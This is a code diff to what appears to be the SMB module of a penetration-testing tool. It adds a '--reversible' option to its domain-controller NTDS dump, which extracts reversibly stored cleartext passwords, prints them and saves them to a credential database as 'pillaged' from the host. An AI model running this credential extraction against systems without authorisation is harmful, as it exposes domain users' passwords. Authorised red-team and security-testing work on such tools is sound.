@@ -2451,9 +2451,26 @@ class smb(connection):
         host_id = self.db.get_hosts(filter_term=self.host)[0][0]
         printed_kerb_keys_banner = False
         printed_trust_keys_banner = False
+        printed_cleartext_banner = False
 
         def add_hash(secret_type, secret, host_id):
-            nonlocal printed_kerb_keys_banner, printed_trust_keys_banner
+            nonlocal printed_kerb_keys_banner, printed_trust_keys_banner, printed_cleartext_banner
+
+            # Kerberos keys are extracted together with cleartext when --reversible is set; only surface them when asked
+            if secret_type == NTDSHashes.SECRET_TYPE.NTDS_KERBEROS and not self.args.kerberos_keys:
+                return
+
+            if secret_type == NTDSHashes.SECRET_TYPE.NTDS_CLEARTEXT:
+                if not printed_cleartext_banner:
+                    self.logger.display("Reversible cleartext passwords:")
+                    printed_cleartext_banner = True
+                self.logger.highlight(secret)
+                identity, _, password = secret.partition(":CLEARTEXT:")
+                domain, _, username = identity.rpartition("\\")
+                if username:
+                    self.db.add_credential("plaintext", domain or self.domain, username, password, pillaged_from=host_id)
+                return
+
             if self.args.kerberos_keys and not printed_kerb_keys_banner and secret_type == NTDSHashes.SECRET_TYPE.NTDS_KERBEROS:
                 self.logger.display("Kerberos keys:")
                 printed_kerb_keys_banner = True
@@ -2519,7 +2536,7 @@ class smb(connection):
             noLMHash=True,
             remoteOps=self.remote_ops,
             useVSSMethod=use_vss_method,
-            justNTLM=not self.args.kerberos_keys,
+            justNTLM=not (self.args.kerberos_keys or self.args.reversible),
             pwdLastSet=False,
             resumeSession=None,
             outputFileName=self.output_filename,
